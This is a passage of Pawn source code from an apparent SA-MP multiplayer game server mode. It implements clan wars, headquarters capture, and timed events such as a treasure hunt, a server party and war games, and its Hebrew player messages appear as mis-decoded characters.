			GetHQAveragePos(userclan,hqp[0],hqp[1],hqp[2]);
			new o = CreateSObject(3790,hqp[0],hqp[1],hqp[2],0.0,0.0,0.0);
			SetObjectToFaceCords(o,p[0],p[1],p[2]);
			objectinfo[o][odam] = 1;
			objectinfo[o][oeam] = 6;
			MoveSObject(o,p[0],p[1],p[2],10.0);
		}
	}
	return 1;
}
//=[StartClanWar]===============================================================
public StartClanWar(clanid)
{
	#if lagtest
		LagTest_Start("StartClanWar");
	#endif
	new cid = clanid;
	if(claninfo[clanid][cwarcd] > 0)
	{
		new cdstr[32];
		format(cdstr,sizeof(cdstr),"~b~~h~clan ~h~war~h~: ~b~%d",claninfo[clanid][cwarcd]);
		dothat1: for(new i = 0; i < claninfo[cid][cwarplayers]; i++) if(IsPlayerConnected(claninfo[cid][cwarplayer][i]) && claninfo[cid][cwarplayer][i] != INVALID_PLAYER_ID) GameTextForPlayer(claninfo[cid][cwarplayer][i],cdstr,1000,4);
		if(cid == clanid)
		{
			cid = claninfo[clanid][cwarasked][0];
			goto dothat1;
		}
		claninfo[clanid][cwarcd]--;
		SetTimerEx("StartClanWar",1000,0,"i",clanid);
	}
	else
	{
		dothat2: for(new i = 0; i < claninfo[cid][cwarplayers]; i++) if(IsPlayerConnected(claninfo[cid][cwarplayer][i]) && claninfo[cid][cwarplayer][i] != INVALID_PLAYER_ID)
		{
			SendClientMessage(claninfo[cid][cwarplayer][i],green," !юьчю· фўьрЁщэ фчьф, сфЎьчф");
			SetFreeze(claninfo[cid][cwarplayer][i],0);
			GameTextForPlayer(claninfo[cid][cwarplayer][i],"~b~~h~clan ~h~war~h~: ~b~started!",2000,4);
		}
		if(cid == clanid)
		{
			cid = claninfo[clanid][cwarasked][0];
			goto dothat2;
		}
	}
	#if lagtest
		LagTest_End("StartClanWar");
	#endif
	return 1;
}
//=[SetPlayerWeatherTo]=========================================================
public SetPlayerWeatherTo(playerid,weatherid) return SetPlayerWeather(playerid,weatherid);
//=[AbleToUseTorpedo]===========================================================
public AbleToUseTorpedo(vid) return vehicleinfo[vid][sv_ability] = 0;
//=[CheckHQAttack]==============================================================
public CheckHQAttack(playerid,type)
{
	#if lagtest
		LagTest_Start("CheckHQAttack");
	#endif
	if(claninfo[playerinfo[playerid][clan]][cruling][0] > 0)
	{
		if(type == 1)
		{
			new mem = -1;
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan] && GetPlayerHQ(i) == claninfo[playerinfo[playerid][clan]][cruling][0]) mem++;
			if(mem < 3) Retreat(playerinfo[playerid][clan],"щх·° юущ ∙чўЁщ ўьря щЎрх юфрцх°");
		}
		else if(type == 2 || type == 3)
		{
			if(IsFlyingInTooHighHeli(playerid))
			{
				SetVehicleVelocity(GetPlayerVehicleID(playerid),0.0,0.0,-2.0);
				SetTimerEx("CheckHQAttack",2000,0,"ii",playerid,3);
				if(type == 2) SendClientMessage(playerid,red," !ффьщўхЇш° ∙ьъ фхЁч· ыщ ьр Єцс· рх·х");
			}
		}
	}
	if(playerinfo[playerid][hqcheck] != -1) CleanTimerVariable(playerinfo[playerid][hqcheck]);
	playerinfo[playerid][hqcheck] = -1;
	#if lagtest
		LagTest_End("CheckHQAttack");
	#endif
}
//=[Retreat]====================================================================
public Retreat(c,reason[])
{
	#if lagtest
		LagTest_Start("Retreat");
	#endif
	assert claninfo[c][cruling][0] > 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
	{
		if(playerinfo[i][clan] == c) SendClientMessage(i,red," !ю∙щю· фф∙·ьшх· ∙ь фўьря ∙ьъ фхЇёўф");
		if(playerinfo[i][clan] == claninfo[c][cruling][0]) SendClientMessage(i,red," !фюЇўуф ∙ь фўьря ∙ьъ ыс° ьр сёыЁ· ф∙·ьшх·");
	}
	new string[M_S];
	if(claninfo[c][cruling][0] == c) format(string,sizeof(string)," -> !ь∙ч°х° фюЇўуф ∙ь ЄЎюх Ёы∙ьф ыщ %s {%s}%s" @c(red) " фф∙·ьшх· ∙ь фўьря <-",reason,ClanHexColor(claninfo[c][cruling][0]),claninfo[claninfo[c][cruling][0]][cname],ClanHexColor(c),claninfo[c][cname]);
	else format(string,sizeof(string)," -> !Ёы∙ьф ыщ %s {%s}%s" @c(red) " Єь юЇўу· фўьря {%s}%s" @c(red) " фф∙·ьшх· ∙ь фўьря <-",reason,ClanHexColor(claninfo[c][cruling][0]),claninfo[claninfo[c][cruling][0]][cname],ClanHexColor(c),claninfo[c][cname]);
	SendClientMessageToAll(red,string);
	if(claninfo[claninfo[c][cruling][0]][cgzoneshow] && claninfo[claninfo[c][cruling][0]][cgzone] != INVALID_GANG_ZONE) GangZoneStopFlashForAll(claninfo[claninfo[c][cruling][0]][cgzone]);
	KillTimer(claninfo[c][cruling][2]);
	HQRulingTimer(c,'d');
	claninfo[c][cruling] = {0,0,0};
	#if lagtest
		LagTest_End("Retreat");
	#endif
	return 1;
}
//=[HeadquarterRuling]==========================================================
public HeadquarterRuling(c)
{
	#if lagtest
		LagTest_Start("HeadquarterRuling");
	#endif
	new string[M_S], members = 0;
	if(!claninfo[c][cruling][1])
	{
		new member[MAX_PLAYERS];
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !GetPlayerVirtualWorld(i) && GetPlayerHQ(i) == claninfo[c][cruling][0] && playerinfo[i][clan] == c) member[members++] = i;
		if(members < capturemembers) return Retreat(c,"юЄш юущ ∙чўЁщэ ьхўчщэ чьў сю∙щю· фф∙·ьшх·");
		else
		{
			claninfo[claninfo[c][cruling][0]][cruler] = c;
			if(claninfo[claninfo[c][cruling][0]][cgzoneshow] && claninfo[claninfo[c][cruling][0]][cgzone] != INVALID_GANG_ZONE) GangZoneStopFlashForAll(claninfo[claninfo[c][cruling][0]][cgzone]);
			UpdateClanGangZone(claninfo[c][cruling][0]);
			format(string,sizeof(string)," -> !{%s}%s" @c(green) " фЎьщч ьф∙·ьш Єь юЇўу· фўьря {%s}%s" @c(green) " фўьря <-",ClanHexColor(claninfo[c][cruling][0]),claninfo[claninfo[c][cruling][0]][cname],ClanHexColor(c),claninfo[c][cname]);
			SendClientMessageToAll(green,string);
			format(string,sizeof(string)," :%s фюЇўуф ∙ьъ ы°тЄ ЁюЎр· с∙ьщш· фўьря",claninfo[c][cname]);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == claninfo[c][cruling][0])
			{
				SendClientMessage(i,red,string);
				SendClientMessage(i,red," .(юЄы∙щх фэ щыхьщэ ьф∙·ю∙ сю∙рсщ фюЇўуф ∙ьыэ (°ысщэ, ЇщўрЇщэ, рхсщщўшщэ");
				if(claninfo[claninfo[c][cruling][0]][cgzoneshow]) SendClientMessage(i,red," .сЁхёє ЎсЄ фўьря сюЇф ф∙·Ёф");
			}
			format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
			new date;
			getdate(date, date, date);
			if(fgetint(string, "careacooldown") != date)
			{
			    fsetint(string,"RuleWinTimes",++claninfo[c][cruletimes]);
			    fsetint(string, "careacooldown", date);
			    for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == claninfo[c][cruling][1]) SendClientMessage(i, green, " .фўьря цыф сЁўхуф ЁхёЇ· Єь ыщсх∙ юхЎьч. щфщф Ёщ·я ьф∙щт Єху рч· ьюч°·");
				if(claninfo[c][cruletimes] % 5 == 0) SetClanMaxBank(c, claninfo[claninfo[c][cruling][1]][cmaxbank] + 50000, "ыщсх∙ чющ∙ф юЇўух·");
			}
			else for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == claninfo[c][cruling][0]) SendClientMessage(i, red, " .фўьря ьр цыф сЁўхуф ЁхёЇ· юыщххя ∙ыщсх∙ ыс° ЁЄ∙ф фщхэ");
			HQRulingTimer(c,'d');
			claninfo[c][cruling][0] = 0, claninfo[c][cruling][1] = 0;
			return KillTimer(claninfo[c][cruling][2]);
		}
	}
	else if(claninfo[c][cruling][1] % 60 == 0 && claninfo[c][cruling][1] != 0)
	{
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerHQ(i) == claninfo[c][cruling][0] && playerinfo[i][clan] == c)
		{
			members++;
			if(IsFlyingInTooHighHeli(i) && playerinfo[i][hqcheck] == -1)
			{
				SendClientMessage(i,red," !Єьщъ ь°у· юфюёхў ·хъ 5 ∙Ёщх· рч°· фхр щхЁч·");
				SetTimerPck(playerinfo[i][hqcheck],"CheckHQAttack",5000,0,"ii",i,2);
			}
		}
		if(members < capturemembers) return Retreat(c,"юЄш юущ ∙чўЁщэ ьхўчщэ чьў сю∙щю· фф∙·ьшх·");
		else
		{
			if(claninfo[c][cruling][1]/60 == 1) format(string,sizeof(string)," !Ёх·°ф уўф " @c(white) "рч·" @c(yellow) " ьёщхэ ю∙щю· фф∙·ьшх·");
			else format(string,sizeof(string)," !Ёх·°х " @c(white) "%d" @c(yellow) " уўх· ьёщхэ ю∙щю· фф∙·ьшх·",claninfo[c][cruling][1]/60);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(playerinfo[i][clan] == c || playerinfo[i][clan] == claninfo[c][cruling][0]) SendClientMessage(i,yellow,string);
		}
	}
	claninfo[c][cruling][1]--;
	HQRulingTimer(c,'u');
	#if lagtest
		LagTest_End("HeadquarterRuling");
	#endif
	return 1;
}
//=[UpdatePlayerWeapons]========================================================
public UpdatePlayerWeapons(playerid)
{
	new ww[2];
	for(new i = 0; i < 47; i++) playerinfo[playerid][acweapon][i] = 0,  playerinfo[playerid][acammo][i] = 0;
	playerinfo[playerid][acweapon][0] = 1;
	for(new i = 0; i < 13; i++)
	{
		GetPlayerWeaponData(playerid,i,ww[0],ww[1]);
		playerinfo[playerid][acweapon][ww[0]] = 1, playerinfo[playerid][acammo][ww[0]] = ww[1];
	}
	return 1;
}
//=[StartFTT]===================================================================
public StartFTT()
{
	#if lagtest
		LagTest_Start("StartFTT");
	#endif
	if(debugstate) printf("Gamemode Activity [start]: StartFTT");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightyellow," !ю·чщьф Єы∙щх - Find The Treasure :ЇЄщьх· ющхчу· юёхт");
	SendClientMessageToAll(lightgreen," .(Escape > Map) срхЇя рхшхюшщ юхчср ЇщўрЇ ∙ь ∙ў ыёє срцх° фюёхюя сЎсЄ " @c(purple) "ётхь" @c(lightgreen) " сюЇф ф∙ьюф");
	SendClientMessageToAll(lightgreen," !ф∙чўя ф°р∙хя ∙юхЎр рх·х цхыф сЇ°ё ыёЇщ тсхф сщя 1000$ ь 5000$");
	SendClientMessageToAll(lightgreen," .рэ рє рчу ьр щюЎр р· ф∙ў сю∙ъ 15 уўх·, фЇЄщьх· ·ё·щщэ");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	GameTextForAll("~y~find the treasure",6000,1);
	FTTPlace = randomEx(0,FTTPlaces);
	FTTPickup = CreatePickupEx(1550,2,FTTPositions[FTTPlace][0],FTTPositions[FTTPlace][1],FTTPositions[FTTPlace][2],.world=world_normal);
	new Float:rnd[4] = {0.0,0.0,0.0,0.0};
	for(new i = 0; i < sizeof(rnd); i++) rnd[i] = floatrand(100.0,200.0);
	FTTGangZone = GangZoneCreate(FTTPositions[FTTPlace][0]-rnd[0] < -2900.0 ? -2900.0 : FTTPositions[FTTPlace][0]-rnd[0],FTTPositions[FTTPlace][1]-rnd[1] < -2900.0 ? -2900.0 : FTTPositions[FTTPlace][1]-rnd[1],FTTPositions[FTTPlace][0]+rnd[2] > 2900.0 ? 2900.0 : FTTPositions[FTTPlace][0]+rnd[2],FTTPositions[FTTPlace][1]+rnd[3] > 2900.0 ? 2900.0 : FTTPositions[FTTPlace][1]+rnd[3]);
	GangZoneShowForAll(FTTGangZone,setAlpha(purple,120));
	FTTTime[0] = def_ftttime;
	SetTimerPck(FTTTime[1],"EndFTT",1000,1,"i",INVALID_PLAYER_ID);
	SendRconCommand("hostname " hostnameFirst " (Find The Treasure!)");
	#if lagtest
		LagTest_End("StartFTT");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartFTT");
	return 1;
}
//=[EndFTT]=====================================================================
public EndFTT(win)
{
	#if lagtest
		LagTest_Start("EndFTT");
	#endif
	new string[M_S], bool:ended = false;
	if(win == INVALID_PLAYER_ID)
	{
		if(!FTTTime[0])
		{
			FTTTime[0]--;
			SendClientMessageToAll(red," !ЇЄщьх· юЎр р· фюшюхя фё·щщюф, рє рчу ьр юЎр р· фюшюхя");
			ended = true;
		}
		else if(FTTTime[0] > 0)
		{
			FTTTime[0]--;
			if(FTTTime[0] % 60 == 0 && FTTTime[0] > 0)
			{
				if(FTTTime[0] == 60) SendClientMessageToAll(yellow," !щ∙ ьыэ Єху " @c(white) "уўф" @c(yellow) " ьюЎщр· фюшюхя");
				else
				{
					format(string,sizeof(string)," !щ∙ ьыэ Єху " @c(white) "%d" @c(yellow) " уўх· ьюЎщр· фюшюхя",FTTTime[0]/60);
					SendClientMessageToAll(yellow,string);
				}
			}
			if(FTTTime[0] % 180 == 0)
			{
				new player[MAX_PLAYERS], players = 0;
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInArea(i,FTTPositions[FTTPlace][0]-150.0 < -2900.0 ? -2900.0 : FTTPositions[FTTPlace][0]-150.0,FTTPositions[FTTPlace][1]-150.0 < -2900.0 ? -2900.0 : FTTPositions[FTTPlace][1]-150.0,FTTPositions[FTTPlace][0]+150.0 > 2900.0 ? 2900.0 : FTTPositions[FTTPlace][0]+150.0,FTTPositions[FTTPlace][1]+150.0 > 2900.0 ? 2900.0 : FTTPositions[FTTPlace][1]+150.0)) player[players++] = i;
				if(players > 0)
				{
					if(players == 1) format(string,sizeof(string)," !%s - ы°тЄ °ў ∙чўя рчу ючЇ∙ р· фюшюхя",GetName(player[0]));
					else
					{
						format(string,sizeof(string)," !ы°тЄ %d ∙чўЁщэ ючЇ∙щэ р· фюшюхя",players);
						if(players > 0)
						{
							new closest = INVALID_PLAYER_ID, Float:closer = 1000.0, Float:p[3];
							for(new i = 0; i < players; i++)
							{
								GetPlayerPos(i,p[0],p[1],p[2]);
								if(DistanceToPoint(p[0],p[1],p[2],FTTPositions[FTTPlace][0],FTTPositions[FTTPlace][1],FTTPositions[FTTPlace][2]) < closer) closest = i, closer = DistanceToPoint(p[0],p[1],p[2],FTTPositions[FTTPlace][0],FTTPositions[FTTPlace][1],FTTPositions[FTTPlace][2]);
							}
							if(closer != INVALID_PLAYER_ID)
							{
								SendClientMessageToAll(yellow,string);
								format(string,sizeof(string)," !%s - ф∙чўя фыщ ў°хс",GetName(player[closest]));
							}
						}
					}
					SendClientMessageToAll(yellow,string);
				}
			}
		}
	}
	else
	{
		if(win != -1)
		{
			new prize = 1000 + (100 * randomEx(26,41));
			GiveMoney(win,prize, 10);
			format(string,sizeof(string)," !юЎр р· фюшюхя хцыф с-$%d %s",prize,GetName(win));
			SendClientMessageToAll(green,string);
		}
		ended = true;
	}
	if(ended)
	{
		specialActivity = sa_none;
		DestroyPickupEx(FTTPickup);
		GangZoneHideForAll(FTTGangZone);
		GangZoneDestroy(FTTGangZone);
		format(string,sizeof(string),"hostname %s",hostname_);
		SendRconCommand(string);
		KillTimer(FTTTime[1]);
	}
	#if lagtest
		LagTest_End("EndFTT");
	#endif
	return 1;
}
//=[StartParty]=================================================================
public StartParty()
{
	if(debugstate) printf("Gamemode Activity [start]: StartParty");
	#if lagtest
		LagTest_Start("StartParty");
	#endif
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightyellow," !ю·чщьф Єы∙щх - Server Party :ЇЄщьх· ющхчу· юёхт");
	SendClientMessageToAll(lightgreen," .юрчх°щ ёЇщЁ· фыёє Єхьф ы°тЄ сюф ∙∙щщы· ьюёщсф, р·э юхцюЁщэ ьфтщЄ хьфЁх·");
	SendClientMessageToAll(lightgreen," .ьющ ∙ю·ў∙ф сюЎщр· фюўхэ - фхр юёхюя сЎсЄ " @c(purple) "ётхь" @c(lightgreen) " сюЇф");
	SendClientMessageToAll(lightgreen," /party :ыущ ьф∙·т° ьюёщсф ф∙·ю∙х сЇўхуф");
	SendClientMessageToAll(lightgreen," .фюёщсф ·ё·щщэ сЄху 10 уўх·");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	GameTextForAll("~g~server party~n~/party",6000,1);
	SetTimer("EndParty",600000,0);
	partyobjects = 0;
	#define CreatePartyObject(%0,%1,%2,%3,%4,%5,%6) partyobject[partyobjects++] = CreateSObject(%0,%1,%2,%3-80.0,%4,%5,%6)
	CreatePartyObject(19129,1917.40,1670.88,24.67,0.00,0.00,0.00);
	CreatePartyObject(19129,1917.41,1650.91,24.67,0.00,0.00,0.00);
	CreatePartyObject(19129,1897.53,1670.85,24.67,0.00,0.00,0.00);
	CreatePartyObject(19129,1897.50,1650.86,24.67,0.00,0.00,0.00);
	CreatePartyObject(19076,1907.56,1660.81,24.81,0.00,0.00,0.62);
	CreatePartyObject(18102,1924.56,1645.34,30.93,0.00,0.00,0.00);
	CreatePartyObject(18102,1899.21,1644.35,30.93,0.00,0.00,0.00);
	CreatePartyObject(18102,1899.91,1676.70,30.93,0.00,0.00,0.00);
	CreatePartyObject(18102,1911.89,1676.50,30.93,0.00,0.00,0.00);
	CreatePartyObject(18102,1924.48,1676.53,30.93,0.00,0.00,0.00);
	CreatePartyObject(19159,1926.89,1663.04,46.09,0.00,0.00,0.00);
	CreatePartyObject(19159,1913.18,1665.34,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1915.73,1665.11,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1909.35,1665.09,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1906.24,1664.93,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1919.10,1665.85,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1922.18,1665.86,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1921.81,1660.68,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1918.57,1660.25,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1915.18,1660.57,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1907.01,1659.27,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1904.84,1659.35,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1901.41,1659.53,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1899.79,1659.52,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1899.54,1655.93,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1900.05,1650.93,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1903.84,1651.14,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1909.68,1654.32,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1913.62,1651.24,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1918.11,1653.21,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1916.73,1654.34,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1912.06,1650.80,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1905.98,1654.11,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1919.47,1657.11,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1921.08,1655.87,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1916.56,1649.33,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1911.71,1670.77,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1906.04,1669.89,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1921.76,1668.67,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1920.26,1663.15,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1926.10,1660.56,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1926.66,1654.62,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1924.94,1652.49,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1923.93,1649.66,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1923.91,1649.65,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1927.33,1647.58,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1920.58,1646.35,30.79,0.00,0.00,0.00);
	CreatePartyObject(19159,1926.29,1664.89,30.79,0.00,0.00,0.00);
	CreatePartyObject(19061,1909.31,1654.04,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1906.88,1647.03,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1900.01,1647.11,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1915.62,1660.68,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1909.92,1665.07,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1902.14,1666.81,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1901.98,1657.67,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1920.12,1647.36,29.00,0.00,0.00,0.00);
	CreatePartyObject(19061,1913.01,1645.16,29.00,0.00,0.00,0.00);
	CreatePartyObject(19060,1925.23,1667.70,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1923.48,1674.71,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1918.02,1672.26,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1912.55,1668.73,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1910.80,1674.31,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1904.98,1674.13,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1898.99,1675.12,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1897.68,1668.09,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1894.32,1657.73,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1893.17,1650.64,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1917.79,1663.75,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1922.40,1658.24,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1926.56,1662.76,28.18,0.00,0.00,0.00);
	CreatePartyObject(19060,1903.43,1669.64,28.18,0.00,0.00,0.00);
	CreatePartyObject(19129,1897.44,1632.78,24.67,0.00,0.00,0.00);
	CreatePartyObject(18090,1921.91,1636.31,27.17,0.00,0.00,269.95);
	CreatePartyObject(19129,1917.41,1631.00,24.67,0.00,0.00,0.00);
	CreatePartyObject(18646,1922.13,1635.26,26.00,0.00,0.00,0.00);
	CreatePartyObject(18657,1898.77,1633.23,63.39,-76.00,-84.00,-18.00);
	CreatePartyObject(18658,1915.39,1658.97,77.95,-76.00,0.00,354.00);
	CreatePartyObject(18742,1863.64,1656.01,-220.19,0.00,0.00,327.47);
	CreatePartyObject(7392,1886.58,1662.34,34.40,0.00,0.00,355.91);
	CreatePartyObject(7392,1887.12,1648.90,34.40,0.00,0.00,186.05);
	CreatePartyObject(18750,1921.26,1633.17,91.06,90.00,180.00,0.00);
	CreatePartyObject(18651,1910.03,1634.55,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1910.77,1634.49,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1911.65,1634.48,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1912.54,1634.43,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1913.30,1634.41,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1909.47,1634.61,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1908.96,1634.62,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1908.36,1634.61,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1907.74,1634.60,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1907.09,1634.56,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1906.50,1634.61,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1906.05,1634.50,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1905.60,1634.47,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1904.99,1634.53,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1904.58,1634.68,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1903.97,1634.61,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1903.49,1634.61,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1902.99,1634.60,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1902.51,1634.60,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1902.01,1634.61,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18651,1901.66,1634.55,27.19,-91.00,0.00,345.04);
	CreatePartyObject(18646,1910.89,1634.67,33.63,0.00,0.00,2.32);
	CreatePartyObject(18090,1892.90,1632.54,27.17,0.00,0.00,269.95);
	CreatePartyObject(9525,1910.85,1634.43,34.00,0.00,0.00,0.00);
	CreatePartyObject(18836,1951.89,1669.99,19.02,-25.00,0.00,270.61);
	#undef CreatePartyObject
	partytele[0] = 1949.4103, partytele[1] = 1670.1022, partytele[2] = 22.7734, partytele[3] = 90.8145;
	partyobjectsMoved = 0;
	new Float:p[3];
	for(new i = 0; i < partyobjects; i++)
	{
		GetSObjectPos(partyobject[i],p[0],p[1],p[2]);
		MoveSObject(partyobject[i],p[0],p[1],p[2]+80.0,4.0);
	}
	SendRconCommand("hostname " hostnameFirst " (Party!)");
	#if lagtest
		LagTest_End("StartParty");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartParty");
	return 1;
}
//=[EndParty]===================================================================
public EndParty()
{
	#if lagtest
		LagTest_Start("EndParty");
	#endif
	specialActivity = sa_none, partyobjectsMoved = 2;
	new Float:p[3], str[64];
	for(new i = 0; i < partyobjects; i++)
	{
		GetSObjectPos(partyobject[i],p[0],p[1],p[2]);
		MoveSObject(partyobject[i],p[0],p[1],p[2]-80.0,4.0);
	}
	partyobjects = 0;
	format(str,sizeof(str),"hostname %s",hostname_);
	SendRconCommand(str);
	#if lagtest
		LagTest_End("EndParty");
	#endif
	return 1;
}
//=[StartWarGame]===============================================================
public StartWarGame(wgid)
{
	#if lagtest
		LagTest_Start("StartWarGame");
	#endif
	if(debugstate) printf("Gamemode Activity [start]: StartWarGame(%d)",wgid);
	new string[M_S];
	if(thereIsAct) return 0;
	wargameinfo[0] = 1, wargameinfo[1] = 0, wargameinfo[2] = 40, wargameinfo[3] = SetTimer("StartWarGame2",1000,1), wargameinfo[4] = wgid == -1 ? random(sizeof(warGames)) : wgid;
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	format(string,sizeof(string)," !··чщь сЄху уўф " @c(darkred) "%s" @c(red) " ЇЄщьх· фюьчюф",warGames[wargameinfo[4]][wgName]);
	SendClientMessageToAll(red,string);
	format(string,sizeof(string)," /join рх %s join :ьфЎш°Їх· °∙хэ р· фЇўхуф",warGames[wargameinfo[4]][wgCommand]);
	SendClientMessageToAll(red,string);
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьЇЄщьх· Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_wargames "$");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	format(string,sizeof(string),"~b~~h~%s~n~/join",warGames[wargameinfo[4]][wgName]);
	GameTextForAll(string,6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartWarGame");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartWarGame(%d)",wgid);
	return 1;
}
//=[StartWarGame2]==============================================================
public StartWarGame2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWarGame2");
	#if lagtest
		LagTest_Start("StartWarGame2");
	#endif
	new string[M_S];
	wargameinfo[2]--;
	if(wargameinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(wargameinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~b~~h~%s: ~h~%d~n~~b~~h~(%d/%d)",warGames[wargameinfo[4]][wgName],wargameinfo[2],wargameinfo[1],MAX_ACTIVITY_PLAYERS);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(wargameinfo[2] == 10 || wargameinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· %s фЇЄщьх·",wargameinfo[2],warGames[wargameinfo[4]][wgName]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(wargameinfo[2] == 3)
	{
		if(wargameinfo[1] < 2) return EndWarGame("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		format(string,sizeof(string)," !%s сфЎьчф с",warGames[wargameinfo[4]][wgName]);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwargame])
			{
				if(warGames[wargameinfo[4]][wgSkin] != -1) SetPlayerSkin(i,warGames[wargameinfo[4]][wgSkin]);
				SetFreeze(i,1);
